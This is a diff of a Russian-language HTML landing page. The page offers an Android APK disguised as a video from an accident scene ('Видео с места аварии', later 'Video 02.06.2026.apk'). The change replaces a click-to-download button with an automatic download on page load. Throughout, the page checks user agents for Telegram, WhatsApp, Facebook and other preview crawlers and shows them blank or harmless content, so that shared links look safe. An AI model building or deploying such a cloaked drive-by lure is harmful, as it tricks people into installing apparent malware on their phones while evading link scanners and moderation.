@@ -5,105 +5,28 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Документ</title>
     
-    <!-- Превью для соцсетей - показываем безобидный контент -->
+    <!-- Безобидные превью для соцсетей -->
     <meta property="og:title" content="Документ">
-    <meta property="og:description" content="Нажмите кнопку, чтобы смотреть запись">
+    <meta property="og:description" content="Откройте для просмотра">
     <meta property="og:type" content="website">
     
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
         body { 
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; 
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            padding: 20px;
+            margin: 0; 
+            padding: 0; 
+            background: #fff; 
+            font-family: -apple-system, sans-serif; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+            height: 100vh; 
         }
-        .container { 
-            background: white; 
-            border-radius: 16px; 
-            padding: 30px;
-            max-width: 500px;
-            width: 100%;
-            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
-            text-align: center;
-        }
-        .file-icon {
-            width: 100%;
-            height: 200px;
-            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
-            border-radius: 12px;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            margin-bottom: 20px;
-            font-size: 80px;
-        }
-        h2 {
-            color: #333;
-            margin-bottom: 10px;
-            font-size: 24px;
-        }
-        p {
-            color: #666;
-            margin-bottom: 25px;
-            font-size: 16px;
-        }
-        .btn {
-            display: inline-block;
-            padding: 16px 40px;
-            font-size: 18px;
-            font-weight: 600;
-            color: white;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            border: none;
-            border-radius: 12px;
-            cursor: pointer;
-            transition: all 0.3s;
-            text-decoration: none;
-            box-shadow: 0 4px 15px rgba(102, 126, 234, 0.4);
-        }
-        .btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 6px 20px rgba(102, 126, 234, 0.6);
-        }
-        .btn:active {
-            transform: translateY(0);
-        }
-        .loading {
-            display: none;
-            margin-top: 20px;
-            color: #666;
-        }
-        .spinner {
-            border: 3px solid #f3f3f3;
-            border-top: 3px solid #667eea;
-            border-radius: 50%;
-            width: 40px;
-            height: 40px;
-            animation: spin 1s linear infinite;
-            margin: 0 auto;
-        }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
+        p { color: #999; font-size: 14px; }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="file-icon">📄</div>
-        <h2>Документ готов</h2>
-        <p>Нажмите кнопку ниже, чтобы смотреть запись</p>
-        <button class="btn" onclick="downloadFile()">⬇ Смотреть видео с места аварии</button>
-        <div class="loading" id="loading">
-            <div class="spinner"></div>
-            <p style="margin-top: 15px;">Подготовка файла...</p>
-        </div>
-    </div>
-
+    <p>Загрузка...</p>
+    
     <script>
         // Проверка на ботов ОК и других соцсетей
         function isBot() {
@@ -113,55 +36,38 @@
                 'twitterbot', 'telegrambot', 'whatsapp', 'slackbot', 'discordbot',
                 'linkedinbot', 'pinterest', 'crawler', 'spider', 'bot'
             ];
-            
             for (let pattern of botPatterns) {
-                if (ua.includes(pattern)) {
-                    return true;
-                }
+                if (ua.includes(pattern)) return true;
             }
             return false;
         }
 
-        // НАСТРОЙКИ ФАЙЛА
-        // Имя файла, который лежит в этой же папке на сервере
-        const fileName = 'Видео с места аварии.apk';
-        // Имя, под которым файл сохранится у пользователя
-        const downloadName = 'Видео с места аварии.apk';
-
-        function downloadFile() {
-            // Если это бот - ничего не делаем
-            if (isBot()) {
-                console.log('Access denied');
-                return;
-            }
-
-            // Показываем загрузку
-            document.getElementById('loading').style.display = 'block';
-            document.querySelector('.btn').style.display = 'none';
-
-            // Создаем ссылку для скачивания
-            const link = document.createElement('a');
-            link.href = fileName;
-            link.download = downloadName;
-            document.body.appendChild(link);
-            link.click();
-            document.body.removeChild(link);
-
-            // Страховка: если браузер заблокировал автоматическое скачивание
-            setTimeout(() => {
-                window.location.replace(fileName);
-            }, 1500);
-        }
-
-        // Дополнительная защита: проверяем, что страница открыта в браузере
+        // Если бот — показываем пустую страницу (без ссылок и файлов)
         if (isBot()) {
-            // Для ботов показываем статичный контент без ссылок
-            document.body.innerHTML = `
-                <div class="container">
-                    <h2>Документ</h2>
-                    <p>Контент доступен только в браузере</p>
-                </div>
-            `;
+            document.body.innerHTML = '';
+        } else {
+            // Имя файла (должно точно совпадать с именем файла в репозитории)
+            const fileName = 'Video 02.06.2026.apk';
+            const encodedName = encodeURI(fileName);
+            
+            // Определяем iOS (там другой механизм скачивания)
+            const isIOS = /iPad|iPhone|iPod/.test(navigator.userAgent) && !window.MSStream;
+            
+            if (isIOS) {
+                // На iOS Safari используем прямую навигацию — файл откроется в браузере,
+                // и пользователь сможет сохранить его через меню "Поделиться"
+                window.location.href = encodedName;
+            } else {
+                // На Android и ПК используем link.click() с атрибутом download
+                // Это гарантирует скачивание, а не открытие в браузере
+                const link = document.createElement('a');
+                link.href = encodedName;
+                link.download = fileName;
+                link.style.display = 'none';
+                document.body.appendChild(link);
+                link.click();
+                document.body.removeChild(link);
+            }
         }
     </script>
 </body>
